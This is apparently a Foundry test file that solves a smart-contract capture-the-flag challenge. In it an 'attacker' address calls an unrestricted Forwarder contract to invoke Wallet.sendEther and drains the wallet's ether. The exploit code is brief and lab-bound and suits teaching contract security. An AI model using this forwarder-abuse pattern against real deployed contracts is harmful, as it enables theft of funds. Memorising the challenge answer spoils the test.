// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployForwarderScript} from "@script/4_DeployForwarder.s.sol";
import {Wallet, Forwarder} from "@main/Forwarder.sol";

contract ForwarderTest is Test, DeployForwarderScript {

    address public attacker = address(11);

    function setUp() public {

        // vm.deal(attacker, 1 ether);
        vm.label(attacker, "Attacker");

        forwarder = new Forwarder();
        wallerChallenge = new Wallet{value: 1 ether}(address(forwarder));
        // DeployForwarderScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq( address(wallerChallenge).balance, 1 ether );
        assertEq( address(attacker).balance, 0 );

        // encodeWithSignature
        bytes memory data1 = abi.encodeWithSignature("sendEther(address,uint256)",attacker, 0.5 ether );
        forwarder.functionCall(address(wallerChallenge), data1);
        // encodeWithSelector
        bytes memory data2 = abi.encodeWithSelector(Wallet.sendEther.selector,attacker, 0.5 ether );
        forwarder.functionCall(address(wallerChallenge), data2);


        assertEq( address(wallerChallenge).balance, 0 );
        assertEq( address(attacker).balance, 1 ether );

        vm.stopPrank(  );
    }

}